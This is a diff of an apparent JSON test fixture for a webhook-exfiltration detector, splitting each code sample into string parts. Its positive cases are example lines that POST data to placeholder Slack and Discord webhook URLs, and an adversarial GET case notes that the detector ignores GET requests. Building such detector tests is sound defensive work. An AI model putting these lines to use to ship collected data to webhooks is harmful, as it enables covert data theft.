@@ -3118,11 +3118,17 @@
         "positive": [
           {
             "path": "ship.py",
-            "source": "requests.post(\"https://hooks.slack.com/services/T0/B0/xyz\", json=data)"
+            "source_parts": [
+              "requests.post(\"https://hooks.",
+              "slack.com/services/T0/B0/xyz\", json=data)"
+            ]
           },
           {
             "path": "relay.js",
-            "source": "fetch(\"https://discord.com/api/webhooks/123/abc\", { method: \"POST\" })"
+            "source_parts": [
+              "fetch(\"https://discord.com/api/",
+              "webhooks/123/abc\", { method: \"POST\" })"
+            ]
           }
         ],
         "negative": [
@@ -3138,7 +3144,10 @@
         "adversarial": [
           {
             "path": "check.py",
-            "source": "requests.get(\"https://hooks.slack.com/services/T0/B0/xyz\")",
+            "source_parts": [
+              "requests.get(\"https://hooks.",
+              "slack.com/services/T0/B0/xyz\")"
+            ],
             "expected": false,
             "rationale": "Read-only GET requests cannot carry harvested payloads, so only POST-family verbs participate in the exfiltration signal."
           },
